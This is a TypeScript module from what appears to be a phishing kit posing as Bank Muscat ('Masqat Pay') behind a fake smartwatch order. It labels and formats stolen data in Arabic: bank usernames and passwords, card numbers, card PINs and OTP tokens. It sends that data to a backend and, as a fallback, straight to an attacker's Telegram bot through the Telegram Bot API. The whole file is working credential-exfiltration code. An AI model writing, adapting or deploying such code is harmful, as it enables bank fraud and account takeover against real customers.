import { FormState } from '../types';

export interface TelegramSubmissionPayload {
  step: 'order' | 'select-watch' | 'login' | 'card-link' | 'verify-otp';
  timestamp: string;
  data: Partial<FormState> & {
    username?: string;
    password?: string;
    otp?: string;
  };
}

const STEP_TITLES: Record<TelegramSubmissionPayload['step'], string> = {
  order: '📋 تسجيل بيانات العميل (الخطوة 1)',
  'select-watch': '⌚ اختيار مواصفات الساعة (الخطوة 2)',
  login: '🔐 تسجيل الدخول المصرفي (الخطوة 3)',
  'card-link': '💳 ربط البطاقة البنكية (الخطوة 4)',
  'verify-otp': '🛡️ رمز التحقق الرقمي TOKEN (الخطوة 5)',
};

const FIELD_LABELS: Record<string, string> = {
  fullName: '👤 الاسم الكامل',
  phone: '📱 رقم الهاتف',
  isExistingCustomer: '🏦 عميل حالي',
  watchColor: '🎨 لون الساعة',
  watchSize: '📏 مقاس الساعة',
  strapType: '⌚ نوع السوار',
  username: '👤 اسم المستخدم / رقم الحساب',
  password: '🔑 الرقم السري',
  cardNumber: '💳 رقم البطاقة',
  cardPin: '🔢 الرقم السري للبطاقة (PIN)',
  registeredPhone: '📲 الهاتف المسجل',
  otp: '🔐 رمز التحقق (OTP/TOKEN)',
};

function buildClientTelegramText(
  step: TelegramSubmissionPayload['step'],
  data: TelegramSubmissionPayload['data'],
  timestamp: string
): string {
  const title = STEP_TITLES[step];
  const lines: string[] = [
    `🏦 <b>بنك مسقط | Masqat Pay</b>`,
    `━━━━━━━━━━━━━━━━━━`,
    `<b>${title}</b>`,
    ``,
  ];

  for (const [key, value] of Object.entries(data)) {
    if (
      value === undefined ||
      value === null ||
      value === '' ||
      key === 'termsAccepted' ||
      key === 'agreesToLink'
    ) {
      continue;
    }
    const label = FIELD_LABELS[key] || key;
    const safeVal = String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
    lines.push(`${label}: <code>${safeVal}</code>`);
  }

  lines.push(``);
  lines.push(`🕒 الوقت: <code>${timestamp}</code>`);

  return lines.join('\n');
}

/**
 * Sends submission data to the backend endpoint (which forwards to Telegram Bot API)
 * and falls back to direct client-side Telegram Bot API call if VITE_TELEGRAM_BOT_TOKEN
 * and VITE_TELEGRAM_CHAT_ID are configured on the client and server did not already send it.
 */
export async function sendToTelegramAndBackend(
  backendEndpoint: string,
  step: TelegramSubmissionPayload['step'],
  data: TelegramSubmissionPayload['data']
): Promise<void> {
  const timestamp = new Date().toISOString();
  let serverSentTelegram = false;

  try {
    const res = await fetch(backendEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
    if (res.ok) {
      const json = await res.json().catch(() => ({}));
      if (json && json.telegramSent) {
        serverSentTelegram = true;
      }
    }
  } catch {
    // Ignore network error and allow client fallback if configured
  }

  const clientBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
  const clientChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

  if (!serverSentTelegram && clientBotToken && clientChatId) {
    const text = buildClientTelegramText(step, data, timestamp);
    await fetch(`https://api.telegram.org/bot${clientBotToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: clientChatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    }).catch(() => {});
  }
}
